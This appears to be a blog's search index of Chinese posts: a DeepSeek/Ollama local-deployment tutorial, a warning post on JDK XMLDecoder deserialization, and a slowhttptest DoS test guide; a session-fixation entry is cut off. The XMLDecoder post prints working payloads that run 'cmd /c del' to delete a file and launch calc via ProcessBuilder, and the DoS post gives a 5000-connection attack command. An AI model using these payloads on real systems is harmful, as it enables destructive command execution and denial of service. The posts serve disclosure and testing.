<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Deepseek 本地部署各个版本超级详细教学，网页版、软件版</title>
      <link href="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/"/>
      <url>/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/</url>
      
        <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>最近，人工智能行业出现了一股新的浪潮，DeepSeek作为一款备受关注的开源语言模型，凭借其出色的表现和广泛的应用前景，迅速在全球范围内吸引了大量的关注。<br>从技术圈到商业领域，DeepSeek的热度持续上升，甚至出现了“爆满”的趋势。这不仅展现了其强大的技术优势，也表明市场和用户对它的高度期待。</p><p>本篇文章将为大家讲解如何在本地环境中安装并运行DeepSeek模型，同时结合DeepSeek、Ollama、OpenWebUI、Chatbox AI与Cherry Studio等工具，实现高效便捷的模型交互体验。<br>无论你是技术爱好者、开发者还是企业用户，本文将提供简明的部署步骤，帮助你迅速掌握并充分发挥DeepSeek的优势。</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/1.png" class="" title="图片描述"><h4 id="Ollama-介绍"><a href="#Ollama-介绍" class="headerlink" title="Ollama 介绍"></a>Ollama 介绍</h4><p>Ollama 是一个开源平台，专为大型语言模型（LLM）设计，旨在简化用户在本地运行、管理和与这些模型进行互动的过程。其核心特色包括：</p><p><strong>本地部署与离线使用</strong>：支持在本地计算机上运行，无需依赖云服务，确保数据隐私。</p><p><strong>跨平台支持</strong>：兼容 Windows、macOS 和 Linux 系统。</p><p><strong>丰富的模型库</strong>：提供多种预训练模型（如 Llama、DeepSeek 等），并支持用户上传自己的模型。</p><p><strong>易于集成和使用</strong>：提供<a href="https://cloud.tencent.com/product/cli?from_column=20065&from=20065">命令行工具</a>（CLI）、Python SDK 和 RESTful API，方便与其他项目和服务集成。</p><p><strong>性能优化</strong>：支持多 GPU 并行推理加速，能够有效管理内存和计算资源。</p><p><strong>社区驱动</strong>：开源项目，拥有活跃的社区支持。</p><h4 id="Ollama-安装"><a href="#Ollama-安装" class="headerlink" title="Ollama 安装"></a>Ollama 安装</h4><p>打开 Ollama 官方下载页面：<a href="/developer/tools/blog-entry?target=https://ollama.com/download&objectId=2498296&objectType=1&contentType=undefined">https://ollama.com/download</a>。</p><p>在页面中找到 <strong>Windows</strong> 版本的下载链接，点击下载安装程序（通常是一个 <code>.exe</code> 文件）。</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/2.png" class="" title="图片描述"><p>下载完成后，双击下载的 <code>.exe</code> 文件启动安装程序。</p><p>按照安装向导的提示进行操作，包括选择安装路径、接受许可协议等。</p><p>点击“下一步”完成安装。</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/3.png" class="" title="图片描述"><h5 id="如何卸载"><a href="#如何卸载" class="headerlink" title="如何卸载"></a>如何卸载</h5><p>打开控制面板 ——&gt; 卸载程序 ——&gt;找到删除右键</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/4.png" class="" title="图片描述"><h5 id="注意（如果安装D盘看）："><a href="#注意（如果安装D盘看）：" class="headerlink" title="注意（如果安装D盘看）："></a>注意（如果安装D盘看）：</h5><p>将Ollama安装到D盘可以释放C盘空间，避免系统盘拥堵，同时提升性能、增强<a href="https://cloud.tencent.com/product/dsgc?from_column=20065&from=20065">数据安全</a>性，并优化磁盘管理。</p><p>下载之后如果点击直接安装默认会安装在<code>C</code>盘。 <strong>在下载文件所在文件夹中，</strong>右键在终端打开。</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/5.png" class="" title="图片描述"><p>输入以下命令，指定安装路径（例如安装到 <code>D:\Ollama</code>）：</p><ul><li><code>/DIR</code> 参数用于指定安装路径。</li><li>确保路径格式正确，路径中不要包含空格或特殊字符。</li></ul><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">.\OllamaSetup.exe &#x2F;DIR&#x3D;D:\Deekseep\Ollama<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/6.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/7.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/8.png" class="" title="图片描述"><h5 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h5><p>此电脑 ——&gt; 属性 ——&gt;高级系统设置 ——&gt; 环境变量</p><p>Path ——&gt; 编辑 ——&gt; 新建 ——&gt; 路径</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/9.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/10.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/11.png" class="" title="图片描述"><h4 id="Ollama-常用命令"><a href="#Ollama-常用命令" class="headerlink" title="Ollama 常用命令"></a><strong>Ollama 常用命令</strong></h4><p>启动 Ollama</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama serve<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：启动 Ollama 服务。</li></ul><p>创建模型</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama create &lt;模型名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：从 Modelfile 创建一个自定义模型。</li></ul><p>显示模型信息</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama show &lt;模型名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：显示指定模型的详细信息。</li></ul><p>运行模型</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama run &lt;模型名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：下载（如果尚未下载）并运行指定模型。</li></ul><p>停止运行中的模型</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama stop &lt;模型名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：停止正在运行的模型。</li></ul><p>从模型库下载模型</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama pull &lt;模型名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：从 Ollama 模型库下载指定模型。</li></ul><p>将模型推送到模型库</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama push &lt;模型名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：将本地模型推送到模型库（需要权限）。</li></ul><p>列出所有模型</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama list<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：显示本地已下载的所有模型。</li></ul><p>列出正在运行的模型</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama ps<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：显示当前正在运行的模型。</li></ul><p>复制模型</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama cp &lt;源模型名&gt; &lt;目标模型名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：复制一个模型到新的名称。</li></ul><p>删除模型</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama rm &lt;模型名&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：删除本地指定的模型。</li></ul><p>查看帮助信息</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama help<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：显示帮助信息，提供关于所有命令的详细说明。</li></ul><p>查看版本信息</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">ollama --version<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><strong>功能</strong>：显示当前 Ollama 的版本信息。</li></ul><h4 id="deepseek-r1模型下载"><a href="#deepseek-r1模型下载" class="headerlink" title="deepseek-r1模型下载"></a>deepseek-r1模型下载</h4><p>地址：<a href="/developer/tools/blog-entry?target=https://ollama.com/search&objectId=2498296&objectType=1&contentType=undefined">https://ollama.com/search</a></p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/12.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/13.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/14.png" class="" title="图片描述"><h4 id="deepseek-r1模型比较"><a href="#deepseek-r1模型比较" class="headerlink" title="deepseek-r1模型比较"></a>deepseek-r1模型比较</h4><table><thead><tr><th>版本</th><th>适用场景</th><th>资源需求</th><th>性能表现</th></tr></thead><tbody><tr><td>1.5B</td><td>轻量级任务（短文本生成、基础问答）</td><td>资源消耗低，适合低配设备</td><td>生成质量和复杂性有限</td></tr><tr><td>7B&#x2F;8B</td><td>中等复杂度任务（文案生成、表格处理）</td><td>需要中等硬件配置，如 RTX 3060 12G</td><td>性能与资源消耗平衡，适合中等任务</td></tr><tr><td>14B</td><td>复杂任务（长文本生成、数据分析）</td><td>需要较高硬件配置，如 A100</td><td>处理复杂任务能力强，适合专业场景</td></tr><tr><td>32B&#x2F;70B</td><td>超大规模任务（语言建模、大规模训练）</td><td>需要高显存（建议≥24G）或优化后的量化版本</td><td>性能逼近更大模型，适合复杂推理</td></tr></tbody></table><h4 id="构建可视化工具"><a href="#构建可视化工具" class="headerlink" title="构建可视化工具"></a>构建可视化工具</h4><h5 id="open-webui（网页版，局域网可访问）"><a href="#open-webui（网页版，局域网可访问）" class="headerlink" title="open-webui（网页版，局域网可访问）"></a>open-webui（网页版，局域网可访问）</h5><p>Open-WebUI 推荐使用 <strong>Python 3.11</strong>，更高版本可能存在兼容性问题。</p><p>如果未安装 Python，请从 <a href="/developer/tools/blog-entry?target=https://www.python.org/&objectId=2498296&objectType=1&contentType=undefined">Python 官网</a>下载并安装 Python 3.11。</p><p>在终端或命令提示符中运行以下命令：</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">pip install open-webui<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>安装完成后，可以通过以下命令启动 Open-WebUI：</p><p>代码语言：javascript</p><p>代码运行次数：0</p><p>运行</p><p>AI代码解释</p><p>复制</p><pre class="line-numbers language-none"><code class="language-none">open-webui serve<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>启动后，Open-WebUI 默认运行在 <code>http://localhost:8080</code>，可以通过浏览器访问该地址。</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/15.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/16.png" class="" title="图片描述"><p>可以在设置更改，相关内容</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/17.png" class="" title="图片描述"><h5 id="Chatbox-AI（软件版）"><a href="#Chatbox-AI（软件版）" class="headerlink" title="Chatbox AI（软件版）"></a>Chatbox AI（软件版）</h5><p><strong>访问Chatbox AI官网</strong>：前往<a href="/developer/tools/blog-entry?target=https://chatboxai.app/zh&objectId=2498296&objectType=1&contentType=undefined">Chatbox AI官网</a>。</p><p><strong>下载安装包</strong>：根据你的操作系统（Windows、macOS、Linux等）选择对应的安装包。</p><p><strong>安装程序</strong>：双击下载的安装文件，按照提示完成安装。</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/18.png" class="" title="图片描述"><p><strong>选择语言和主题</strong>：安装完成后，启动Chatbox AI客户端，可在设置菜单中选择语言和主题。</p><p><strong>配置****API</strong>：如果需要使用特定的AI模型，可在“API配置”中输入相应的API密钥或选择预设的模型版本。</p><p><strong>连接本地模型（如Ollama）</strong>：</p><p>确保已安装并运行Ollama。</p><p>在Chatbox AI中进入设置，选择“Ollama”作为模型提供方。</p><p>设置API地址为<code>http://localhost:11434</code>，并选择已下载的模型（如DeepSeek）</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/19.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/20.png" class="" title="图片描述"><h5 id="Cherry-Studio（软件版）"><a href="#Cherry-Studio（软件版）" class="headerlink" title="Cherry Studio（软件版）"></a>Cherry Studio（软件版）</h5><p>访问 Cherry Studio 官方网站 <a href="/developer/tools/blog-entry?target=https://cherry-ai.com/download&objectId=2498296&objectType=1&contentType=undefined">https://cherry-ai.com/download</a>，根据您的操作系统（Windows、macOS 或 Linux）选择对应版本的安装包</p><p>下载完成后，双击安装包运行。</p><p>按照安装向导提示选择安装路径和语言（默认为中文）。</p><p>完成安装后，启动客户端并同意用户协议即可进入主界面</p><p><strong>配置本地模型（如 DeepSeek）</strong>：</p><p>安装本地模型（如通过 Ollama 安装 DeepSeek 模型）。</p><p>在 Cherry Studio 中点击左下角的“设置”按钮，进入“模型服务”页面。</p><p>找到对应的本地模型服务（如 Ollama），选择管理并配置本地模型。</p><p><strong>配置云服务（如硅基流动）</strong>：</p><p>注册硅基流动账号并创建 API 密钥。</p><p>在 Cherry Studio 的设置中，找到对应的云服务（如硅基流动），将 API 密钥粘贴到指定位置。</p><p>添加并检查模型（如 DeepSeek-R1 或 DeepSeek-V3），完成配置</p><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/21.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/22.png" class="" title="图片描述"><img src="/2025/11/04/%E7%A8%8B%E5%BA%8F%E4%BA%BA%E7%94%9F/Deepseek%E6%9C%AC%E5%9C%B0%E9%83%A8%E7%BD%B2%E8%B6%85%E7%BA%A7%E8%AF%A6%E7%BB%86%E6%95%99%E5%AD%A6/23.png" class="" title="图片描述"><h4 id="如何使用"><a href="#如何使用" class="headerlink" title="如何使用"></a>如何使用</h4><p>鼠标右键，打开终端</p><p>输入 ollama serve 开启 ollama</p><p>（可选）网页版open-webui</p><p>输入 open-webui serve 不要关掉终端，等一会打开网页，<a href="http://localhost:8080/">http://localhost:8080</a></p><p>（可选）软件版Chatbox AI，打开软件，运行</p><p>（可选）软件版Cherry Studio，打开软件，运行</p>]]></content>
      
      
      <categories>
          
          <category> 程序人生 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 程序人生 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JDK 紧急漏洞，XMLDecoder反序列化攻击</title>
      <link href="/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/JDK%20%E7%B4%A7%E6%80%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/"/>
      <url>/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/JDK%20%E7%B4%A7%E6%80%A5%E6%BC%8F%E6%B4%9E%EF%BC%8CXMLDecoder%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.javastack.cn/17-12-20/73076296.jpg"></p><p>昨天在公司发现了一个jdk中的XMLDecoder反序列化的漏洞，看起来很危险！下面通过两个示例来看看这个漏洞的危害！</p><h4 id="示例1：利用XmlDecoder删除本地文件"><a href="#示例1：利用XmlDecoder删除本地文件" class="headerlink" title="示例1：利用XmlDecoder删除本地文件"></a>示例1：利用XmlDecoder删除本地文件</h4><p>首先来看这个xmldecoder.xml文件内容：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;&lt;java version&#x3D;&quot;1.8.0_151&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;&lt;object class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;4&quot;&gt;&lt;void index&#x3D;&quot;0&quot;&gt;&lt;string&gt;cmd&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void index&#x3D;&quot;1&quot;&gt;&lt;string&gt;&#x2F;c&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void index&#x3D;&quot;2&quot;&gt;&lt;string&gt;del&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void index&#x3D;&quot;3&quot;&gt;&lt;string&gt;e:\1.txt&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;&#x2F;array&gt;&lt;void method&#x3D;&quot;start&quot; &#x2F;&gt;&lt;&#x2F;object&gt;&lt;&#x2F;java&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>再来看利用XMLDecoder解析这个xml文件的示例代码：</p><pre class="line-numbers language-none"><code class="language-none">private static void byXmlFile() &#123;File file &#x3D; new File(&quot;E:\\xmldecoder.xml&quot;);XMLDecoder xd &#x3D; null;try &#123;xd &#x3D; new XMLDecoder(new BufferedInputStream(new FileInputStream(file)));&#125; catch (Exception e) &#123;e.printStackTrace();&#125;Object s2 &#x3D; xd.readObject();xd.close();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码执行后，直接删除了本地的e:\1.txt文件，相当于在命令行调用了cmd &#x2F;c del e:\1.txt命令，直接删除了本地文件，相当恐怖！</p><h4 id="示例2：利用XmlDecoder调用本地程序"><a href="#示例2：利用XmlDecoder调用本地程序" class="headerlink" title="示例2：利用XmlDecoder调用本地程序"></a>示例2：利用XmlDecoder调用本地程序</h4><pre class="line-numbers language-none"><code class="language-none">private static void byXmlString() &#123;String xml &#x3D; new StringBuilder().append(&quot;&lt;?xml version&#x3D;\&quot;1.0\&quot; encoding&#x3D;\&quot;UTF-8\&quot;?&gt;&quot;).append(&quot;&lt;java version&#x3D;\&quot;1.8.0_151\&quot; class&#x3D;\&quot;java.beans.XMLDecoder\&quot;&gt;&quot;).append(&quot;    &lt;object class&#x3D;\&quot;java.lang.ProcessBuilder\&quot;&gt;&quot;).append(&quot;        &lt;array class&#x3D;\&quot;java.lang.String\&quot; length&#x3D;\&quot;1\&quot;&gt;&quot;).append(&quot;            &lt;void index&#x3D;\&quot;0\&quot;&gt;&quot;).append(&quot;                &lt;string&gt;calc&lt;&#x2F;string&gt;&quot;).append(&quot;            &lt;&#x2F;void&gt;&quot;).append(&quot;        &lt;&#x2F;array&gt;&quot;).append(&quot;        &lt;void method&#x3D;\&quot;start\&quot; &#x2F;&gt;&quot;).append(&quot;    &lt;&#x2F;object&gt;&quot;).append(&quot;&lt;&#x2F;java&gt;&quot;).toString();XMLDecoder xd &#x3D; null;try &#123;xd &#x3D; new XMLDecoder(new ByteArrayInputStream(xml.getBytes()));&#125; catch (Exception e) &#123;e.printStackTrace();&#125;Object s2 &#x3D; xd.readObject();xd.close();&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这段代码改成了用String输入源的形式，这不重要，重要的是还是利用了jdk中的XmlDecoder类来解析xml字符串。这段代码执行后，会调用出本地的计算器程序。</p><p><img src="http://img.javastack.cn/17-12-20/29679880.jpg"></p><p>其中ProcessBuilder.start()的方法和Runtime.exec()方法一样，都可以被用来创建一个操作系统进程，可用来控制进程状态并获得相关信息。</p><p>ProcessBuilder的构造方法接受一个命令列表。</p><pre class="line-numbers language-none"><code class="language-none">public ProcessBuilder(List&lt;String&gt; command) &#123;    if (command &#x3D;&#x3D; null)        throw new NullPointerException();    this.command &#x3D; command;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>Jdk中的XmlDecoder反序列化存在安全漏洞，能调用本地的应用，也能执行系统支持的命令，一旦黑客组织成命令列表攻击系统，后果不堪设想！</p><p>我只是用ProcessBuilder类演示了调用系统程序这两种案例，当然还有其他，远不止这一种攻击手段。作者看了下，这个漏洞在jdk8_0_151版本中还存在。</p><p>建议不要用JDK中的XmlDeocder类，寻求其它更安全的xml解析工具类。</p><p>求转发，紧急扩散，避免更大程度的损失！~</p>]]></content>
      
      
      <categories>
          
          <category> 安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Slow HTTP POST 慢速攻击</title>
      <link href="/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Slow%20HTTP%20POST%20%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB/"/>
      <url>/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/Slow%20HTTP%20POST%20%E6%85%A2%E9%80%9F%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="测试工具"><a href="#测试工具" class="headerlink" title="测试工具"></a>测试工具</h2><p><strong>模拟测试工具：slowhttptest</strong></p><blockquote><p><a href="https://github.com/shekyan/slowhttptest">https://github.com/shekyan/slowhttptest</a></p></blockquote><p><strong>安装：</strong></p><blockquote><p><a href="https://github.com/shekyan/slowhttptest/wiki">https://github.com/shekyan/slowhttptest/wiki</a></p></blockquote><p><strong>使用：</strong></p><blockquote><p>slowhttptest -c 5000 -u [hostname&#x2F;ip]</p></blockquote><ul><li><p>-c 表示发起5000个连接，由于是慢速DDOS且是基于http协议的，这里发起的连接请求是确确实实会与服务器进行三次握手并维持与服务器的连接的。</p></li><li><p>-u 注意这里的hostname或者ip都需要在前面加上协议 http:&#x2F;&#x2F;。</p></li></ul><p><strong>模拟测试：</strong></p><pre class="line-numbers language-none"><code class="language-none">.&#x2F;slowhttptest -c 5000 -u https:&#x2F;&#x2F;192.168.1.3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">slow HTTP test status on 50th second:initializing:        0pending:             8connected:           1757error:               0closed:              3service available:   YES<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>攻击如果成功，service available会变成no。</p>]]></content>
      
      
      <categories>
          
          <category> 安全漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安全漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>会话固定攻击漏洞</title>
      <link href="/2025/10/30/%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E/%E4%BC%9A%E8%AF%9D%E5%9B%BA%E5%AE%9A%E6%94%BB%E5%87%BB%E6%BC%8F%E6%B4%9E%EF%BC%88session%20fixation%20attack%EF%BC%89/"/>
